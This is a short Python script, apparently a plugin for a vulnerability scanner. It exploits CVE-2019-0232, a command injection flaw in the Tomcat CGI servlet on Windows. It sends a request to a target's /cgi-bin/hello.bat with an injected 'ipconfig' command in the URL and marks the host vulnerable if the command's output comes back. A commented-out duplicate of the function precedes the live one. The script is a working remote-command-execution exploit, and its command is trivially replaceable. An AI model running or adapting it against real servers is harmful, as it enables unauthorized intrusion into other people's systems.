import requests
import sys
from config.config_requests import headers
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
cmd="ipconfig"
url_dir = "/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5C"

# def run(url,port):
# 	if int(port)==8443 or int(port)==443 :
# 		url1="https://"+str(url)+":"+str(port)
# 		vuln_url=url1+url_dir+cmd
# 	else:
# 		url1="http://"+str(url)+":"+str(port)
# 		vuln_url=url1+url_dir+cmd
# 	r=requests.get(vuln_url,headers=headers,verify=False)
# 	if r.status_code!=404:
# 		if 'Windows IP' in r.text:
# 			return (1,"[+] [%s] is Vulnerable to cve_2019_0232 !"%vuln_url)
# 			#print("\nThe Vuln Response Content: \n\n" , r.text)
# 		else:
# 			return (0,"[-] %s seems no vuln to cve_2019_0232"%url1)
# 	else:
# 		return (0,"[-] %s seems no vuln to cve_2019_0232"%url1)

def run(url,port):
	try:
			if int(port)==8443 or int(port)==443 :
				url1="https://"+str(url)+":"+str(port)
				vuln_url=url1+url_dir+cmd
			else:
				url1="http://"+str(url)+":"+str(port)
				vuln_url=url1+url_dir+cmd
			r=requests.get(vuln_url,headers=headers,verify=False)
			if r.status_code!=404:
				if 'Windows IP' in r.text:
					return (1,"[+] [%s] is Vulnerable to cve_2019_0232 !"%vuln_url)
					#print("\nThe Vuln Response Content: \n\n" , r.text)
				else:
					return (0,"[-] %s seems no vuln to cve_2019_0232"%url1)
			else:
				return (0,"[-] %s seems no vuln to cve_2019_0232"%url1)
	except Exception:
        	return (0,"[-] %s seems no vuln to cve_2019_0232"%url1)

if __name__=="__main__":
    url = sys.argv[1]
    port = int(sys.argv[2])
    run(url,port)